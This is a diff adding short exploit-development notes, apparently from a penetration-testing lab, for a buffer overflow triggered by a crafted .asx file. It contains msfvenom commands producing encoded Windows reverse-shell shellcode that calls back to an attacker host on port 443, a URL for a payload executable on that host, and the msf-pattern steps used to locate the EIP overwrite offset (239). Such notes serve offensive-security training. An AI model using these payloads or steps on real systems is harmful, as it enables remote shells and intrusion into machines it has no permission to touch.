@@ -1,0 +1,23 @@
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.244 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x09\x0a\x1a\x10"
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.244 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x2b"
+
+The exploit.asx code only contains 254 AAAA's and no shellcode
+
+
+http://192.168.119.244/asx_4.exe
+
+
+
+// Need to find the exact offset to control the EIP 
+
+// First create unique pattern
+kali@kali:~$ msf-pattern_create -l 255
+
+char overwrite_offset[255] = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4";
+
+
+//Run the program and then check the EIP address which is 30694139
+// Then find the offset using this.
+
+kali@kali:~$ msf-pattern_offset -l 255 -q 30694139
+[*] Exact match at offset 239
